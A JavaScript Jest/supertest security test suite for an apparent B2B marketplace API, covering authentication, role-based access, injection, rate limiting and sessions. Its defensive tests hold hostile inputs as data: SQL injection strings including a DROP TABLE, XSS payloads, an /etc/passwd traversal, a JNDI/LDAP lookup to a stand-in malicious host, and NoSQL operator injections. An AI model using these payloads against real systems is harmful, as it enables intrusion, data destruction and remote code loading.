/**
 * Security Testing Suite - Authentication & Authorization
 * Wholexale.com B2B Marketplace - Security Tests
 */

const request = require('supertest');
const app = require('../../backend/server');

describe('Security Tests - Authentication & Authorization', () => {
    let authToken;
    let userToken;
    let adminToken;

    beforeAll(async () => {
        // Setup test users with different roles
        const buyerResponse = await request(app)
            .post('/api/auth/login')
            .send({
                email: 'buyer@wholexale.com',
                password: 'password123',
            });

        const sellerResponse = await request(app)
            .post('/api/auth/login')
            .send({
                email: 'seller@wholexale.com',
                password: 'password123',
            });

        const adminResponse = await request(app)
            .post('/api/auth/login')
            .send({
                email: 'admin@wholexale.com',
                password: 'password123',
            });

        userToken = buyerResponse.body.token;
        sellerToken = sellerResponse.body.token;
        adminToken = adminResponse.body.token;
    });

    describe('Authentication Security', () => {
        test('should reject requests without authentication token', async () => {
            const response = await request(app)
                .get('/api/products')
                .expect(401);

            expect(response.body).toHaveProperty('message');
            expect(response.body.message).toContain('Unauthorized');
        });

        test('should reject requests with invalid tokens', async () => {
            const response = await request(app)
                .get('/api/products')
                .set('Authorization', 'Bearer invalid-token')
                .expect(401);

            expect(response.body).toHaveProperty('message');
        });

        test('should reject requests with malformed tokens', async () => {
            const malformedTokens = [
                'Bearer',
                'Bearer ',
                'Bearer abc',
                'invalid-format-token',
                'null',
                'undefined',
            ];

            for (const token of malformedTokens) {
                const response = await request(app)
                    .get('/api/products')
                    .set('Authorization', token)
                    .expect(401);

                expect(response.body).toHaveProperty('message');
            }
        });

        test('should handle token expiration gracefully', async () => {
            // Simulate expired token (this would be a real JWT with past expiry in practice)
            const expiredToken = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyLCJleHAiOjE1MTYyMzkwMDB9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c';

            const response = await request(app)
                .get('/api/products')
                .set('Authorization', `Bearer ${expiredToken}`)
                .expect(401);

            expect(response.body).toHaveProperty('message');
        });

        test('should prevent token reuse after logout', async () => {
            // First, login to get a valid token
            const loginResponse = await request(app)
                .post('/api/auth/login')
                .send({
                    email: 'buyer@wholexale.com',
                    password: 'password123',
                });

            const token = loginResponse.body.token;

            // Use the token successfully
            await request(app)
                .get('/api/auth/me')
                .set('Authorization', `Bearer ${token}`)
                .expect(200);

            // Logout (invalidate token)
            await request(app)
                .post('/api/auth/logout')
                .set('Authorization', `Bearer ${token}`)
                .expect(200);

            // Try to use the same token again - should be rejected
            const response = await request(app)
                .get('/api/auth/me')
                .set('Authorization', `Bearer ${token}`)
                .expect(401);

            expect(response.body).toHaveProperty('message');
        });
    });

    describe('Authorization & Role-Based Access', () => {
        test('should prevent buyers from accessing seller-only endpoints', async () => {
            // Buyers should not be able to access seller dashboard
            const response = await request(app)
                .get('/api/seller/dashboard')
                .set('Authorization', `Bearer ${userToken}`)
                .expect(403);

            expect(response.body).toHaveProperty('message');
            expect(response.body.message).toContain('Forbidden');
        });

        test('should prevent sellers from accessing admin-only endpoints', async () => {
            // Sellers should not be able to access admin analytics
            const response = await request(app)
                .get('/api/admin/analytics')
                .set('Authorization', `Bearer ${sellerToken}`)
                .expect(403);

            expect(response.body).toHaveProperty('message');
        });

        test('should allow authorized users to access their own resources', async () => {
            // User should be able to access their own profile
            const response = await request(app)
                .get('/api/auth/me')
                .set('Authorization', `Bearer ${userToken}`)
                .expect(200);

            expect(response.body).toHaveProperty('id');
            expect(response.body).toHaveProperty('email');
        });

        test('should prevent users from accessing other users\' resources', async () => {
            // Get another user's ID first
            const otherUserResponse = await request(app)
                .get('/api/users')
                .set('Authorization', `Bearer ${adminToken}`)
                .expect(200);

            if (otherUserResponse.body.length > 1) {
                const otherUserId = otherUserResponse.body[1]._id;

                // Try to access another user's resources
                const response = await request(app)
                    .get(`/api/users/${otherUserId}/profile`)
                    .set('Authorization', `Bearer ${userToken}`)
                    .expect(403);

                expect(response.body).toHaveProperty('message');
            }
        });

        test('should enforce resource ownership for orders', async () => {
            // Create an order as a buyer
            const createOrderResponse = await request(app)
                .post('/api/orders')
                .set('Authorization', `Bearer ${userToken}`)
                .send({
                    products: [
                        {
                            productId: 'test-product-id',
                            quantity: 10,
                            price: 100,
                        }
                    ],
                    totalAmount: 1000,
                })
                .expect(201);

            const orderId = createOrderResponse.body._id;

            // Try to access the order as a different user
            const response = await request(app)
                .get(`/api/orders/${orderId}`)
                .set('Authorization', `Bearer ${sellerToken}`)
                .expect(403);

            expect(response.body).toHaveProperty('message');
        });
    });

    describe('Input Validation & Injection Prevention', () => {
        test('should prevent SQL injection in login', async () => {
            const sqlInjectionPayloads = [
                "admin' OR '1'='1",
                "'; DROP TABLE users; --",
                "admin' UNION SELECT * FROM users --",
                "1' OR '1'='1",
            ];

            for (const payload of sqlInjectionPayloads) {
                const response = await request(app)
                    .post('/api/auth/login')
                    .send({
                        email: payload,
                        password: 'password123',
                    })
                    .expect(401);

                expect(response.body).toHaveProperty('message');
            }
        });

        test('should prevent XSS in user inputs', async () => {
            const xssPayloads = [
                '<script>alert("xss")</script>',
                '"><script>alert("xss")</script>',
                "javascript:alert('xss')",
                '<img src="x" onerror="alert(\'xss\')">',
            ];

            for (const payload of xssPayloads) {
                const response = await request(app)
                    .post('/api/auth/register')
                    .send({
                        email: `test${Date.now()}@wholexale.com`,
                        password: 'password123',
                        name: payload,
                        role: 'buyer',
                    })
                    .expect(400); // Should be rejected due to validation

                expect(response.body).toHaveProperty('errors');
            }
        });

        test('should validate and sanitize product inputs', async () => {
            const maliciousInputs = [
                '<script>alert("xss")</script>',
                '../../../etc/passwd',
                '${jndi:ldap://malicious.com}',
                '"><script>alert("xss")</script>',
            ];

            for (const input of maliciousInputs) {
                const response = await request(app)
                    .post('/api/products')
                    .set('Authorization', `Bearer ${sellerToken}`)
                    .send({
                        name: input,
                        description: 'Malicious input test',
                        price: 100,
                        category: 'Electronics',
                        moq: 1,
                        stock: 10,
                    })
                    .expect(400);

                expect(response.body).toHaveProperty('errors');
            }
        });

        test('should prevent NoSQL injection in MongoDB queries', async () => {
            const nosqlInjectionPayloads = [
                { '$ne': null },
                { '$regex': '.*' },
                { '$where': 'this.password' },
                { '$gt': '' },
            ];

            for (const payload of nosqlInjectionPayloads) {
                const response = await request(app)
                    .get('/api/products')
                    .set('Authorization', `Bearer ${userToken}`)
                    .query({ category: JSON.stringify(payload) })
                    .expect(400);

                expect(response.body).toHaveProperty('errors');
            }
        });
    });

    describe('Rate Limiting & DoS Protection', () => {
        test('should implement rate limiting on authentication endpoints', async () => {
            const requests = Array(11).fill().map(() =>
                request(app)
                    .post('/api/auth/login')
                    .send({
                        email: 'nonexistent@wholexale.com',
                        password: 'wrongpassword',
                    })
            );

            const responses = await Promise.all(requests);
            const rateLimited = responses.find(r => r.status === 429);

            expect(rateLimited).toBeTruthy();
            expect(rateLimited.body).toHaveProperty('message');
        });

        test('should limit concurrent requests from same IP', async () => {
            const concurrentRequests = Array(50).fill().map(() =>
                request(app)
                    .get('/api/products')
                    .set('Authorization', `Bearer ${userToken}`)
            );

            const responses = await Promise.all(concurrentRequests);
            const tooManyRequests = responses.filter(r => r.status === 429);

            expect(tooManyRequests.length).toBeGreaterThan(0);
        });

        test('should handle large payload attacks', async () => {
            const largePayload = 'a'.repeat(1000000); // 1MB payload

            const response = await request(app)
                .post('/api/products')
                .set('Authorization', `Bearer ${sellerToken}`)
                .send({
                    name: largePayload,
                    description: largePayload,
                    price: 100,
                    category: 'Electronics',
                    moq: 1,
                    stock: 10,
                })
                .expect(413); // Payload too large

            expect(response.body).toHaveProperty('message');
        });
    });

    describe('Session Management', () => {
        test('should maintain session security', async () => {
            // Login and verify session is established
            const loginResponse = await request(app)
                .post('/api/auth/login')
                .send({
                    email: 'buyer@wholexale.com',
                    password: 'password123',
                });

            const token = loginResponse.body.token;
            expect(token).toBeDefined();

            // Use token in multiple requests
            for (let i = 0; i < 5; i++) {
                const response = await request(app)
                    .get('/api/auth/me')
                    .set('Authorization', `Bearer ${token}`)
                    .expect(200);
            }

            // Logout should invalidate the session
            await request(app)
                .post('/api/auth/logout')
                .set('Authorization', `Bearer ${token}`)
                .expect(200);

            // Subsequent requests should fail
            const response = await request(app)
                .get('/api/auth/me')
                .set('Authorization', `Bearer ${token}`)
                .expect(401);
        });

        test('should handle concurrent sessions appropriately', async () => {
            // Login from multiple "devices"
            const session1 = await request(app)
                .post('/api/auth/login')
                .send({
                    email: 'buyer@wholexale.com',
                    password: 'password123',
                });

            const session2 = await request(app)
                .post('/api/auth/login')
                .send({
                    email: 'buyer@wholexale.com',
                    password: 'password123',
                });

            expect(session1.body.token).toBeDefined();
            expect(session2.body.token).toBeDefined();
            expect(session1.body.token).not.toBe(session2.body.token);

            // Both sessions should work
            await request(app)
                .get('/api/auth/me')
                .set('Authorization', `Bearer ${session1.body.token}`)
                .expect(200);

            await request(app)
                .get('/api/auth/me')
                .set('Authorization', `Bearer ${session2.body.token}`)
                .expect(200);
        });
    });

    describe('Data Protection & Privacy', () => {
        test('should not expose sensitive data in responses', async () => {
            const response = await request(app)
                .get('/api/auth/me')
                .set('Authorization', `Bearer ${userToken}`)
                .expect(200);

            const userData = response.body;

            // Should not expose password or password hash
            expect(userData).not.toHaveProperty('password');
            expect(userData).not.toHaveProperty('passwordHash');
            expect(userData).not.toHaveProperty('salt');

            // Should not expose internal MongoDB _id if it's not needed
            expect(userData).not.toHaveProperty('__v');
        });

        test('should implement proper data filtering', async () => {
            // Create a product as a seller
            const createResponse = await request(app)
                .post('/api/products')
                .set('Authorization', `Bearer ${sellerToken}`)
                .send({
                    name: 'Test Product',
                    description: 'Test Description',
                    price: 100,
                    category: 'Electronics',
                    moq: 1,
                    stock: 10,
                });

            const productId = createResponse.body._id;

            // Get the product - buyers should see different data than sellers
            const buyerResponse = await request(app)
                .get(`/api/products/${productId}`)
                .set('Authorization', `Bearer ${userToken}`)
                .expect(200);

            const sellerResponse = await request(app)
                .get(`/api/products/${productId}`)
                .set('Authorization', `Bearer ${sellerToken}`)
                .expect(200);

            // Seller should see more detailed information
            expect(sellerResponse.body).toHaveProperty('costPrice');
            expect(buyerResponse.body).not.toHaveProperty('costPrice');
        });

        test('should implement proper access controls for financial data', async () => {
            // Users should only see their own financial data
            const response = await request(app)
                .get('/api/finance/credit')
                .set('Authorization', `Bearer ${userToken}`)
                .expect(200);

            expect(response.body).toHaveProperty('creditLimit');
            expect(response.body).toHaveProperty('availableCredit');
            expect(response.body).toHaveProperty('userId', userToken.userId);
        });
    });

    describe('Security Headers & HTTPS', () => {
        test('should include security headers', async () => {
            const response = await request(app)
                .get('/api/products')
                .set('Authorization', `Bearer ${userToken}`);

            expect(response.headers).toHaveProperty('x-content-type-options');
            expect(response.headers).toHaveProperty('x-frame-options');
            expect(response.headers).toHaveProperty('x-xss-protection');
        });

        test('should enforce HTTPS in production', async () => {
            // This would be tested in production environment
            // For now, we check that the middleware is in place
            const response = await request(app)
                .get('/api/products')
                .set('Authorization', `Bearer ${userToken}`)
                .set('x-forwarded-proto', 'http');

            // In production, this should redirect to HTTPS
            // For testing, we just ensure the header check is in place
            expect(response.status).toBe(200);
        });
    });

    describe('Error Handling & Information Disclosure', () => {
        test('should not disclose sensitive information in error messages', async () => {
            const sensitiveEndpoints = [
                '/api/auth/login',
                '/api/auth/register',
                '/api/products',
                '/api/orders',
            ];

            for (const endpoint of sensitiveEndpoints) {
                const response = await request(app)
                    .get(endpoint)
                    .set('Authorization', 'Bearer invalid-token');

                // Error messages should not contain stack traces or internal details
                expect(response.body.message).not.toMatch(/error/i);
                expect(response.body.message).not.toContain('MongoDB');
                expect(response.body.message).not.toContain('database');
                expect(response.body.message).not.toContain('SQL');
            }
        });

        test('should handle 404 errors without information disclosure', async () => {
            const response = await request(app)
                .get('/api/nonexistent-endpoint')
                .set('Authorization', `Bearer ${userToken}`);

            expect(response.status).toBe(404);
            expect(response.body).toHaveProperty('message');

            // Should not reveal server information
            expect(response.body.message).not.toContain('Express');
            expect(response.body.message).not.toContain('Node.js');
        });
    });
});
